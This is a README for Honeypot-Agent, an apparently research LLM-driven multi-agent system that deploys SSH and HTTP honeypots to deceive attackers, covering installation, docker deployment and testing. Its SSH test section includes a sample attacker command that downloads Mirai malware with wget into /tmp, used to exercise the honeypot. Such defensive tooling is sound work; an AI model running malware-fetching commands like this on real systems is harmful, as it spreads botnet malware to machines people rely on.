# Honeypot-Agent

## Overview
Honeypot-Agent is a novel LLM-driven multi-agent system that automatically deploys honeypots and deceives hacker TTP.

The Honeypot-Agent framework consists of several modules corresponding to aforementioned penetration testing stages:

1. honeypot Agent
2. Planning Agent
3. llm_response Agent
4. defense Agent



## Installation

### 1. Download Source Code
```
git clone https://github.com/kaiwei666a/honeypots.git

```

### 2. Setup Environment Variables

Need to fill in the openai environment variables. 
If you run directly locally, enter in the terminal:` $env:OPENAI_API_KEY="openai key"`
If use docker deployment, please set it in the `docker-compose.yml` file.



### 3. Install Dependencies

- Python version: 3.11

- Python libraries can be installed by running
```
  pip install -r requirements.txt
```

It is recommended to create a virtual environment before installing dependencies
```
conda create -n venv python=3.11    
conda activate venv               
python -m pip install -r requirements.txt 
```


## Run Agents

WARNING: This deployment is not done in a container, so it may be dangerous. If you want to run it in docker, please follow the steps for "deploy in docker" to avoid unexpected consequences when executing.

After running the code, the honeypot starts
```bash
# Run honeypot
python honeypots/honeypots_agent.py
```



## Deploy in docker

```bash
# Compile environment
docker compose build

# Run environment
docker compose up -d
```

After the test, delete the environment with the following command.

```
docker compose down -v
```




## Test
Two types of honeypots can be tested, namely ssh honeypot and http honeypot

### ssh

```bash
# Connecting to the honeypot
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@localhost -p 2222
#Please enter the password after connecting
# After entering the password, you will enter the dialogue interface. Please use the Linux command to attack or display the file.
#Example
ls 
#Downloading malicious files
wget http://loclhost/mirai -O /tmp/mirai 

# All attacker operations will be recorded in honeypot.log, and can also be viewed at http://localhost:8186/logs
```

### http
If you want to test the http honeypot, comment out the existing code in honeypots_agent and then run the commented-out code.

```bash
# Send a request to the http honeypot
Invoke-WebRequest -Uri "http://127.0.0.1:8186/command" -Method POST -Body "ls -la"   #You can also directly open http://localhost:8186/ in browser or use postman
```


